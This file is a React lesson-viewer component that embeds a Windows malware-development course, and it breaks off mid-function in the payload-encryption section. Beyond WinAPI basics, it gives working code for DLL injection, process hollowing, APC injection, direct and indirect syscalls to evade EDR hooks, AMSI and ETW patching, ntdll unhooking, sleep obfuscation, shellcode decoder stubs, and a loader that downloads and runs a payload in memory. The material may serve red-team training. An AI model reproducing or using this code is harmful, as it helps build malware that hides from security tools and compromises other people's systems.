import { Card } from "@/components/ui/card";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { BookOpen } from "lucide-react";

interface LessonViewerProps {
  moduleId: string;
}

const LessonViewer = ({ moduleId }: LessonViewerProps) => {
  const lessons: Record<string, any> = {
    fundamentals: {
      title: "C/C++ WinAPI Fundamentals",
      sections: [
        {
          title: "Windows Data Types",
          content: `Windows defines its own data types for portability and clarity. Understanding these is crucial.`,
          code: `// Essential Windows Types
DWORD  // 32-bit unsigned integer
QWORD  // 64-bit unsigned integer
HANDLE // Opaque pointer to kernel object
PVOID  // Pointer to void (void*)
LPSTR  // Pointer to string (char*)
LPWSTR // Pointer to wide string (wchar_t*)
BOOL   // Boolean (TRUE=1, FALSE=0)
HMODULE // Handle to module/DLL
SIZE_T // Size type (architecture dependent)

// Example Usage
HANDLE hProcess = NULL;
DWORD dwProcessId = 1234;
LPVOID lpBaseAddress = NULL;`,
          language: "c"
        },
        {
          title: "Handles & Objects",
          content: `Handles are references to kernel objects. They're indices into a per-process handle table.`,
          code: `// Opening a process handle
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS,  // Desired access
    FALSE,               // Inherit handle
    dwProcessId          // Process ID
);

if (hProcess == NULL) {
    // Handle error
}

// ALWAYS close handles when done
CloseHandle(hProcess);

// Key Kernel Objects:
// - Processes, Threads, Files
// - Mutexes, Semaphores, Events
// - Registry Keys, Tokens`,
          language: "c"
        },
        {
          title: "Error Handling",
          content: `WinAPI functions return error codes. Use GetLastError() to retrieve them.`,
          code: `#include <windows.h>
#include <stdio.h>

HANDLE hFile = CreateFileA(
    "test.txt",
    GENERIC_READ,
    0, NULL,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    NULL
);

if (hFile == INVALID_HANDLE_VALUE) {
    DWORD dwError = GetLastError();
    printf("Error: %lu\\n", dwError);
    
    // Common Error Codes:
    // ERROR_FILE_NOT_FOUND = 2
    // ERROR_ACCESS_DENIED = 5
    // ERROR_INVALID_HANDLE = 6
}`,
          language: "c"
        },
        {
          title: "Strings & Unicode",
          content: `Windows uses UTF-16 (wide chars). Modern apps should use Unicode variants.`,
          code: `// ANSI vs Unicode
CreateFileA()  // ANSI version (char*)
CreateFileW()  // Unicode version (wchar_t*)
CreateFile()   // Macro - resolves to A or W

// String Types
char    szAnsi[] = "ANSI String";
wchar_t szWide[] = L"Unicode String";

// Converting between them
#include <stringapiset.h>

// ANSI to Wide
char* ansi = "Hello";
wchar_t wide[256];
MultiByteToWideChar(CP_UTF8, 0, ansi, -1, wide, 256);

// Wide to ANSI
WideCharToMultiByte(CP_UTF8, 0, wide, -1, ansi, 256, NULL, NULL);`,
          language: "c"
        },
        {
          title: "Essential Headers",
          content: `Key header files you'll use constantly in Windows programming.`,
          code: `#include <windows.h>    // Master header (includes most)
#include <winternl.h>   // NT native structures
#include <tlhelp32.h>   // Toolhelp APIs (snapshots)
#include <psapi.h>      // Process Status API
#include <winnt.h>      // NT definitions
#include <ntstatus.h>   // NT status codes

// Link required libraries
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

// Typical includes for maldev:
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>`,
          language: "c"
        }
      ]
    },
    "windows-internals": {
      title: "Windows Internals & Win32 API",
      sections: [
        {
          title: "Process Architecture",
          content: `A process is a container for execution. Each has its own virtual address space, handle table, and at least one thread.`,
          code: `// Process Structure (simplified)
typedef struct _EPROCESS {
    KPROCESS Pcb;              // Kernel Process Block
    LIST_ENTRY ActiveProcessLinks;
    HANDLE UniqueProcessId;
    LIST_ENTRY ThreadListHead;
    PVOID SectionBaseAddress;  // Image base
    PVOID ImageFileName;
} EPROCESS;

// Creating a process
STARTUPINFOA si = {0};
PROCESS_INFORMATION pi = {0};
si.cb = sizeof(si);

CreateProcessA(
    NULL,           // Application name
    "notepad.exe",  // Command line
    NULL, NULL,     // Security
    FALSE,          // Inherit handles
    0,              // Creation flags
    NULL,           // Environment
    NULL,           // Current directory
    &si,            // Startup info
    &pi             // Process info
);

CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);`,
          language: "c"
        },
        {
          title: "Virtual Memory",
          content: `Each process has 4GB (x86) or 128TB (x64) virtual address space. Kernel manages translation to physical memory.`,
          code: `// Allocating memory in remote process
LPVOID pRemoteBuffer = VirtualAllocEx(
    hProcess,                    // Target process
    NULL,                        // Let system decide address
    dwSize,                      // Size to allocate
    MEM_COMMIT | MEM_RESERVE,    // Allocation type
    PAGE_EXECUTE_READWRITE       // Protection
);

// Writing to remote memory
SIZE_T bytesWritten;
WriteProcessMemory(
    hProcess,
    pRemoteBuffer,
    lpBuffer,
    dwSize,
    &bytesWritten
);

// Memory Protection Constants:
// PAGE_NOACCESS, PAGE_READONLY
// PAGE_READWRITE, PAGE_EXECUTE
// PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE`,
          language: "c"
        },
        {
          title: "Win32 vs Native API",
          content: `Win32 APIs (kernel32.dll) are wrappers around Native APIs (ntdll.dll). Native APIs talk directly to kernel.`,
          code: `// Win32 API (High Level)
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS,
    FALSE,
    dwPid
);

// Native API (Low Level)
#include <winternl.h>

typedef NTSTATUS (NTAPI *pNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

OBJECT_ATTRIBUTES oa = {0};
CLIENT_ID cid = {0};
cid.UniqueProcess = (HANDLE)dwPid;

HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
pNtOpenProcess NtOpenProcess = 
    (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");

HANDLE hProcess;
NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);`,
          language: "c"
        },
        {
          title: "PE Format Basics",
          content: `Portable Executable format - structure of Windows executables and DLLs.`,
          code: `// PE Structure Overview
DOS Header (IMAGE_DOS_HEADER)
  -> e_magic = 0x5A4D ("MZ")
  -> e_lfanew = offset to PE header

PE Header (IMAGE_NT_HEADERS)
  -> Signature = 0x4550 ("PE")
  -> FileHeader (IMAGE_FILE_HEADER)
  -> OptionalHeader (IMAGE_OPTIONAL_HEADER)
      -> ImageBase, AddressOfEntryPoint
      -> DataDirectory[16]

Section Headers (IMAGE_SECTION_HEADER)
  -> .text (code), .data (initialized data)
  -> .rdata (read-only), .rsrc (resources)

// Parsing PE in memory
PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)
    ((BYTE*)hModule + pDosHeader->e_lfanew);
    
DWORD dwEntryPoint = pNtHeaders->OptionalHeader.AddressOfEntryPoint;`,
          language: "c"
        },
        {
          title: "Thread Internals",
          content: `Threads are units of execution. Each has its own stack, context, and TEB (Thread Environment Block).`,
          code: `// Creating a thread
HANDLE hThread = CreateThread(
    NULL,              // Security attributes
    0,                 // Stack size
    ThreadProc,        // Start function
    lpParameter,       // Parameter
    0,                 // Creation flags
    &dwThreadId        // Thread ID
);

// Thread function signature
DWORD WINAPI ThreadProc(LPVOID lpParam) {
    // Thread code here
    return 0;
}

// Remote thread (in target process)
HANDLE hRemoteThread = CreateRemoteThread(
    hProcess,
    NULL, 0,
    (LPTHREAD_START_ROUTINE)pRemoteCode,
    pRemoteParam,
    0, NULL
);

WaitForSingleObject(hRemoteThread, INFINITE);`,
          language: "c"
        }
      ]
    },
    "process-injection": {
      title: "Process Injection & Memory Manipulation",
      sections: [
        {
          title: "Classic DLL Injection",
          content: `Inject a DLL into target process by forcing it to call LoadLibrary.`,
          code: `#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD dwPid, const char* dllPath) {
    // 1. Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, dwPid);
    if (!hProcess) return FALSE;
    
    // 2. Allocate memory for DLL path
    SIZE_T pathLen = strlen(dllPath) + 1;
    LPVOID pRemotePath = VirtualAllocEx(
        hProcess, NULL, pathLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    // 3. Write DLL path to remote process
    WriteProcessMemory(hProcess, pRemotePath,
        dllPath, pathLen, NULL);
    
    // 4. Get LoadLibraryA address
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    
    // 5. Create remote thread to call LoadLibrary
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        pRemotePath, 0, NULL
    );
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}`,
          language: "c"
        },
        {
          title: "Process Hollowing",
          content: `Create a process in suspended state, unmap its memory, and replace with malicious payload.`,
          code: `// Process Hollowing Steps:
// 1. Create target process suspended
STARTUPINFOA si = {0};
PROCESS_INFORMATION pi = {0};
si.cb = sizeof(si);

CreateProcessA(NULL, "svchost.exe", NULL, NULL,
    FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Get context to find image base
CONTEXT ctx = {0};
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);

// 3. Read PEB to get image base
PVOID pImageBase;
ReadProcessMemory(pi.hProcess,
    (PVOID)(ctx.Rdx + 0x10), // PEB.ImageBaseAddress
    &pImageBase, sizeof(PVOID), NULL);

// 4. Unmap original executable
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
pNtUnmapViewOfSection NtUnmap = ...;
NtUnmap(pi.hProcess, pImageBase);

// 5. Allocate new memory and write payload
// 6. Update entry point in context
// 7. Resume thread`,
          language: "c"
        },
        {
          title: "APC Queue Injection",
          content: `Queue an APC (Asynchronous Procedure Call) to execute code when thread enters alertable state.`,
          code: `// APC Injection
VOID InjectViaAPC(HANDLE hProcess, HANDLE hThread, PVOID pPayload) {
    // Allocate memory in target
    LPVOID pRemoteBuffer = VirtualAllocEx(
        hProcess, NULL, payloadSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // Write payload
    WriteProcessMemory(hProcess, pRemoteBuffer,
        pPayload, payloadSize, NULL);
    
    // Queue APC to thread
    QueueUserAPC(
        (PAPCFUNC)pRemoteBuffer,
        hThread,
        NULL  // Parameter
    );
    
    // Thread must be in alertable state:
    // - SleepEx, WaitForSingleObjectEx
    // - MsgWaitForMultipleObjectsEx
}

// Target thread needs to call:
SleepEx(0, TRUE);  // Alertable wait`,
          language: "c"
        },
        {
          title: "Memory Scanning",
          content: `Scan process memory to find patterns or signatures.`,
          code: `// Pattern scanning
PVOID FindPattern(HANDLE hProcess, BYTE* pattern, 
                 SIZE_T patternLen, PVOID startAddr) {
    MEMORY_BASIC_INFORMATION mbi;
    BYTE* buffer = (BYTE*)malloc(0x1000000); // 16MB
    
    PVOID addr = startAddr;
    while (VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT && 
            mbi.Protect != PAGE_NOACCESS) {
            
            SIZE_T bytesRead;
            ReadProcessMemory(hProcess, mbi.BaseAddress,
                buffer, mbi.RegionSize, &bytesRead);
            
            // Search for pattern
            for (SIZE_T i = 0; i < bytesRead - patternLen; i++) {
                if (memcmp(buffer + i, pattern, patternLen) == 0) {
                    free(buffer);
                    return (PVOID)((BYTE*)mbi.BaseAddress + i);
                }
            }
        }
        addr = (PVOID)((BYTE*)mbi.BaseAddress + mbi.RegionSize);
    }
    free(buffer);
    return NULL;
}`,
          language: "c"
        }
      ]
    },
    "syscalls": {
      title: "Syscalls & Native API",
      sections: [
        {
          title: "System Service Numbers",
          content: `Each syscall has an SSN (System Service Number) that identifies it to the kernel. These change between Windows versions.`,
          code: `// Syscall mechanism
// User Mode: ntdll.dll -> syscall instruction
// Kernel Mode: nt!KiSystemServiceUser -> service handler

// Example: NtAllocateVirtualMemory
// Windows 10: SSN = 0x18
// Windows 11: SSN = 0x18 (usually same, but verify)

// Syscall stub in ntdll.dll looks like:
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN
    syscall
    ret

// We can extract SSNs at runtime from ntdll`,
          language: "asm"
        },
        {
          title: "Direct Syscalls",
          content: `Bypass usermode hooks by directly invoking syscalls. Avoids EDR hooks in ntdll.dll.`,
          code: `// Direct syscall implementation
extern "C" NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// Assembly implementation (x64)
.code
SysNtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h    ; SSN for NtAllocateVirtualMemory
    syscall
    ret
SysNtAllocateVirtualMemory ENDP
END

// Usage:
PVOID baseAddr = NULL;
SIZE_T size = 0x1000;
SysNtAllocateVirtualMemory(
    (HANDLE)-1, &baseAddr, 0, &size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);`,
          language: "c"
        },
        {
          title: "Hell's Gate",
          content: `Dynamically extract SSNs from ntdll.dll at runtime. Handles hooked functions by finding clean syscall stubs.`,
          code: `// Hell's Gate technique
BOOL GetSSN(LPCSTR functionName, WORD* ssn) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID pFunction = GetProcAddress(hNtdll, functionName);
    
    if (!pFunction) return FALSE;
    
    // Check if function is hooked
    // Clean stub: 4C 8B D1 B8 [SSN] 00 00
    BYTE* bytes = (BYTE*)pFunction;
    
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && 
        bytes[2] == 0xD1 && bytes[3] == 0xB8) {
        // Extract SSN from bytes[4] and bytes[5]
        *ssn = *(WORD*)(bytes + 4);
        return TRUE;
    }
    
    // If hooked, search nearby functions
    return FALSE;
}

// Use extracted SSN
WORD ssn;
GetSSN("NtAllocateVirtualMemory", &ssn);
// Now call with dynamic SSN`,
          language: "c"
        },
        {
          title: "Halo's Gate",
          content: `Improvement over Hell's Gate. If target function is hooked, search neighboring functions to calculate SSN.`,
          code: `// Halo's Gate - handle hooked functions
WORD GetSSNByHalo(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID pFunc = GetProcAddress(hNtdll, functionName);
    
    // Try to get SSN from current function
    WORD ssn;
    if (GetSSN(functionName, &ssn)) return ssn;
    
    // Function is hooked, search neighbors
    // Syscalls are sequential: Nt* functions
    // Try +32 bytes (next function)
    for (int i = 1; i < 500; i++) {
        BYTE* nextFunc = (BYTE*)pFunc + (i * 32);
        
        if (nextFunc[0] == 0x4C && nextFunc[1] == 0x8B) {
            WORD neighborSSN = *(WORD*)(nextFunc + 4);
            // Calculate original SSN
            return neighborSSN - i;
        }
    }
    return 0;
}`,
          language: "c"
        },
        {
          title: "Indirect Syscalls",
          content: `Execute syscall instruction from ntdll.dll memory to avoid detection of syscall instructions in your code.`,
          code: `// Find a syscall instruction in ntdll
PVOID FindSyscallInstruction() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* base = (BYTE*)hNtdll;
    
    // Search for: 0F 05 (syscall) followed by C3 (ret)
    for (SIZE_T i = 0; i < 0x100000; i++) {
        if (base[i] == 0x0F && base[i+1] == 0x05 &&
            base[i+2] == 0xC3) {
            return &base[i];
        }
    }
    return NULL;
}

// Indirect syscall via function pointer
typedef NTSTATUS (*SyscallPtr)();
SyscallPtr pSyscall = (SyscallPtr)FindSyscallInstruction();

// Setup registers and call
__asm {
    mov r10, rcx
    mov eax, [ssn]  ; Your SSN
    jmp pSyscall    ; Jump to syscall instruction
}`,
          language: "c"
        }
      ]
    },
    "pinvoke": {
      title: "P/Invoke & .NET Interop",
      sections: [
        {
          title: "P/Invoke Basics",
          content: `Platform Invoke lets C# call unmanaged Win32 APIs and native DLLs.`,
          code: `using System;
using System.Runtime.InteropServices;

class Program {
    // Import Win32 API
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);
    
    // Constants
    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    
    static void Main() {
        uint pid = 1234;
        IntPtr hProcess = OpenProcess(
            PROCESS_ALL_ACCESS, false, pid);
        
        if (hProcess != IntPtr.Zero) {
            Console.WriteLine("Process opened!");
            CloseHandle(hProcess);
        }
    }
}`,
          language: "csharp"
        },
        {
          title: "Structure Marshalling",
          content: `Pass complex structures between managed and unmanaged code.`,
          code: `using System.Runtime.InteropServices;

// Define unmanaged structure
[StructLayout(LayoutKind.Sequential)]
struct PROCESS_INFORMATION {
    public IntPtr hProcess;
    public IntPtr hThread;
    public uint dwProcessId;
    public uint dwThreadId;
}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
struct STARTUPINFO {
    public uint cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    // ... more fields
}

[DllImport("kernel32.dll", SetLastError = true)]
static extern bool CreateProcess(
    string lpApplicationName,
    string lpCommandLine,
    IntPtr lpProcessAttributes,
    IntPtr lpThreadAttributes,
    bool bInheritHandles,
    uint dwCreationFlags,
    IntPtr lpEnvironment,
    string lpCurrentDirectory,
    ref STARTUPINFO lpStartupInfo,
    out PROCESS_INFORMATION lpProcessInformation
);`,
          language: "csharp"
        },
        {
          title: "D/Invoke",
          content: `Dynamic invocation - resolve and call APIs at runtime without static imports. Bypasses static analysis.`,
          code: `using System;
using System.Runtime.InteropServices;

class DInvoke {
    // Get function delegate dynamically
    public static T GetLibraryFunction<T>(
        string libraryName, string functionName) {
        
        IntPtr hModule = LoadLibrary(libraryName);
        IntPtr pFunction = GetProcAddress(hModule, functionName);
        
        return Marshal.GetDelegateForFunctionPointer<T>(pFunction);
    }
    
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string dllName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    // Usage:
    delegate IntPtr OpenProcessDelegate(uint access, bool inherit, uint pid);
    
    static void Main() {
        var OpenProcess = GetLibraryFunction<OpenProcessDelegate>(
            "kernel32.dll", "OpenProcess");
        
        IntPtr hProc = OpenProcess(0x1F0FFF, false, 1234);
    }
}`,
          language: "csharp"
        },
        {
          title: "In-Memory Assembly Loading",
          content: `Load and execute .NET assemblies from memory without touching disk.`,
          code: `using System;
using System.Reflection;

class MemoryLoader {
    static void LoadAndExecute(byte[] assemblyBytes) {
        // Load assembly from byte array
        Assembly asm = Assembly.Load(assemblyBytes);
        
        // Get entry point
        MethodInfo entryPoint = asm.EntryPoint;
        
        // Invoke with parameters
        object[] parameters = new object[] { 
            new string[] { "arg1", "arg2" } 
        };
        entryPoint.Invoke(null, parameters);
    }
    
    // Download and execute
    static void Main() {
        // Could download from web or decrypt from resources
        byte[] payload = DownloadPayload("http://...");
        LoadAndExecute(payload);
    }
    
    static byte[] DownloadPayload(string url) {
        using (var client = new System.Net.WebClient()) {
            return client.DownloadData(url);
        }
    }
}`,
          language: "csharp"
        },
        {
          title: "Function Pointers",
          content: `Use delegates as callbacks for unmanaged code.`,
          code: `using System;
using System.Runtime.InteropServices;

class CallbackExample {
    // Define callback delegate
    delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
    
    [DllImport("user32.dll")]
    static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
    
    [DllImport("user32.dll")]
    static extern int GetWindowText(IntPtr hWnd, 
        System.Text.StringBuilder text, int count);
    
    static bool EnumWindowCallback(IntPtr hWnd, IntPtr lParam) {
        var sb = new System.Text.StringBuilder(256);
        GetWindowText(hWnd, sb, 256);
        
        if (sb.Length > 0) {
            Console.WriteLine(sb.ToString());
        }
        return true;  // Continue enumeration
    }
    
    static void Main() {
        EnumWindows(EnumWindowCallback, IntPtr.Zero);
    }
}`,
          language: "csharp"
        }
      ]
    },
    "evasion": {
      title: "Evasion Techniques",
      sections: [
        {
          title: "AMSI Bypass",
          content: `Antimalware Scan Interface - scans scripts at runtime. Multiple bypass techniques exist.`,
          code: `// Method 1: Memory Patching (classic)
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c=$b
    }
}
$d=$c.GetFields('NonPublic,Static');
Foreach($e in $d) {
    if ($e.Name -like "*Context") {
        $f=$e
    }
}
$g=$f.GetValue($null);
[IntPtr]$ptr=$g;
[Int32[]]$buf = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);

// Method 2: C# AMSI Bypass
using System.Runtime.InteropServices;

var amsi = Win32.LoadLibrary("amsi.dll");
var addr = Win32.GetProcAddress(amsi, "AmsiScanBuffer");
uint oldProtect;
Win32.VirtualProtect(addr, (UIntPtr)5, 0x40, out oldProtect);

// Patch with: xor eax, eax; ret (B8 00 00 00 00 C3)
byte[] patch = { 0x31, 0xC0, 0xC3 };
Marshal.Copy(patch, 0, addr, 3);`,
          language: "csharp"
        },
        {
          title: "ETW Patching",
          content: `Event Tracing for Windows - logs API calls. Patch to prevent EDR visibility.`,
          code: `// Patch EtwEventWrite to prevent logging
using System;
using System.Runtime.InteropServices;

class EtwPatch {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    static extern bool VirtualProtect(
        IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);
    
    static void PatchETW() {
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
        
        uint oldProtect;
        VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out oldProtect);
        
        // Patch with RET instruction (0xC3)
        Marshal.WriteByte(etwAddr, 0xC3);
        
        VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);
    }
}`,
          language: "csharp"
        },
        {
          title: "API Unhooking",
          content: `EDRs hook APIs in ntdll.dll. Restore clean versions from disk or remote process.`,
          code: `// Unhook ntdll by reading clean copy from disk
#include <windows.h>

BOOL UnhookNtdll() {
    // Get current ntdll in memory
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    // Map fresh copy from disk
    HANDLE hFile = CreateFileA(
        "C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL);
    
    HANDLE hMapping = CreateFileMappingA(
        hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    
    LPVOID pMapping = MapViewOfFile(
        hMapping, FILE_MAP_READ, 0, 0, 0);
    
    // Get .text section from both
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)
        ((BYTE*)hNtdll + pDos->e_lfanew);
    
    // Copy clean .text section
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSect = 
            IMAGE_FIRST_SECTION(pNt) + i;
        
        if (strcmp((char*)pSect->Name, ".text") == 0) {
            DWORD oldProtect;
            VirtualProtect(
                (BYTE*)hNtdll + pSect->VirtualAddress,
                pSect->Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE, &oldProtect);
            
            memcpy(
                (BYTE*)hNtdll + pSect->VirtualAddress,
                (BYTE*)pMapping + pSect->VirtualAddress,
                pSect->Misc.VirtualSize);
            
            VirtualProtect(
                (BYTE*)hNtdll + pSect->VirtualAddress,
                pSect->Misc.VirtualSize,
                oldProtect, &oldProtect);
        }
    }
    
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return TRUE;
}`,
          language: "c"
        },
        {
          title: "Sleep Obfuscation",
          content: `Encrypt memory during sleep to evade memory scanners.`,
          code: `// Ekko sleep obfuscation technique
#include <windows.h>

VOID EkkoSleep(DWORD dwMilliseconds) {
    // 1. Create event for timer
    HANDLE hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    
    // 2. Create timer queue timer
    HANDLE hTimer = NULL;
    CreateTimerQueueTimer(&hTimer, NULL,
        (WAITORTIMERCALLBACK)SetEvent,
        hEvent, dwMilliseconds, 0, 0);
    
    // 3. Get current image range
    PVOID pImageBase = GetModuleHandleA(NULL);
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImageBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)
        ((BYTE*)pImageBase + pDos->e_lfanew);
    DWORD dwImageSize = pNt->OptionalHeader.SizeOfImage;
    
    // 4. Encrypt memory
    DWORD oldProtect;
    VirtualProtect(pImageBase, dwImageSize, PAGE_READWRITE, &oldProtect);
    
    // XOR encrypt with key
    for (SIZE_T i = 0; i < dwImageSize; i++) {
        ((BYTE*)pImageBase)[i] ^= 0xAA;
    }
    
    // 5. Wait for timer
    WaitForSingleObject(hEvent, INFINITE);
    
    // 6. Decrypt memory
    for (SIZE_T i = 0; i < dwImageSize; i++) {
        ((BYTE*)pImageBase)[i] ^= 0xAA;
    }
    
    VirtualProtect(pImageBase, dwImageSize, oldProtect, &oldProtect);
}`,
          language: "c"
        }
      ]
    },
    "shellcode": {
      title: "Shellcode Development",
      sections: [
        {
          title: "Position Independent Code",
          content: `Shellcode must work at any memory address. Requires special techniques for finding function addresses.`,
          code: `; x64 PIC Shellcode basics
section .text
global _start

_start:
    ; Get current RIP
    call get_rip
get_rip:
    pop rbx           ; RBX = current address
    
    ; Find kernel32.dll base from PEB
    mov rax, gs:[0x60]    ; PEB
    mov rax, [rax + 0x18] ; PEB->Ldr
    mov rax, [rax + 0x20] ; InMemoryOrderModuleList
    mov rax, [rax]        ; Second entry (ntdll)
    mov rax, [rax]        ; Third entry (kernel32)
    mov rax, [rax + 0x20] ; DllBase
    
    ; Now RAX = kernel32.dll base
    ; Parse PE headers to find exports`,
          language: "asm"
        },
        {
          title: "Function Resolution",
          content: `Dynamically resolve API addresses using PEB and export tables.`,
          code: `; Resolve GetProcAddress
section .text

; Input: RCX = module base, RDX = hash of function name
; Output: RAX = function address
ResolveFunctionByHash:
    push rbx
    push rcx
    push rdx
    
    ; Get DOS header
    mov ebx, [rcx + 0x3C]  ; e_lfanew
    add rbx, rcx           ; NT headers
    
    ; Get export directory
    mov ebx, [rbx + 0x88]  ; OptionalHeader.DataDirectory[0]
    add rbx, rcx           ; Export directory
    
    mov esi, [rbx + 0x20]  ; AddressOfNames
    add rsi, rcx
    
    xor r8, r8             ; Counter
    
.loop:
    lodsd                  ; Load name RVA
    add rax, rcx           ; Name address
    
    ; Hash function name
    xor r9, r9
.hash_loop:
    lodsb
    test al, al
    jz .check_hash
    ror r9d, 13
    add r9d, eax
    jmp .hash_loop
    
.check_hash:
    cmp r9d, edx           ; Compare with target hash
    je .found
    inc r8
    jmp .loop
    
.found:
    ; Get function address from ordinal
    mov esi, [rbx + 0x24]  ; AddressOfNameOrdinals
    add rsi, rcx
    movzx eax, word [rsi + r8*2]
    
    mov esi, [rbx + 0x1C]  ; AddressOfFunctions
    add rsi, rcx
    mov eax, [rsi + rax*4]
    add rax, rcx
    
    pop rdx
    pop rcx
    pop rbx
    ret`,
          language: "asm"
        },
        {
          title: "Encoder/Decoder Stubs",
          content: `Encode shellcode to evade signature detection. Prepend decoder stub.`,
          code: `// XOR Encoder in C
void XorEncode(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Decoder stub (x64 assembly)
section .text
global decoder_stub

decoder_stub:
    jmp encoded_data
decoder:
    pop rsi              ; RSI = encoded data address
    xor rcx, rcx
    mov cl, SHELLCODE_LEN
    mov bl, XOR_KEY
    
decode_loop:
    xor byte [rsi], bl
    inc rsi
    loop decode_loop
    
    jmp encoded_data     ; Jump to decoded shellcode
    
encoded_data:
    call decoder
    ; Encoded shellcode bytes here
    db 0x??, 0x??, ...`,
          language: "asm"
        },
        {
          title: "Syscall Shellcode",
          content: `Direct syscall shellcode for maximum stealth.`,
          code: `; Direct syscall example: NtAllocateVirtualMemory
section .text
global shellcode_start

shellcode_start:
    ; Setup parameters
    xor r9, r9           ; Protect = PAGE_EXECUTE_READWRITE
    mov r9d, 0x40
    
    mov r8, 0x3000       ; AllocationType = MEM_COMMIT | MEM_RESERVE
    
    lea rdx, [rel size]  ; RegionSize
    
    lea rcx, [rel addr]  ; BaseAddress
    
    xor eax, eax
    dec rax              ; ProcessHandle = -1 (current)
    mov r10, rax
    
    ; Make syscall
    mov eax, 0x18        ; SSN for NtAllocateVirtualMemory
    syscall
    
    ; Check result
    test eax, eax
    jnz error
    
    ; Write shellcode to allocated memory
    ; ... continue execution
    
addr: dq 0
size: dq 0x1000`,
          language: "asm"
        },
        {
          title: "Payload Encryption",
          content: `Encrypt final payload with AES or RC4 before execution.`,
          code: `#include <windows.h>
#include <wincrypt.h>

// AES decrypt shellcode
BOOL AESDecrypt(BYTE* encrypted, DWORD encLen, 
                BYTE* key, DWORD keyLen, 
                BYTE** decrypted, DWORD* decLen) {
    
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    
    // Get crypto provider
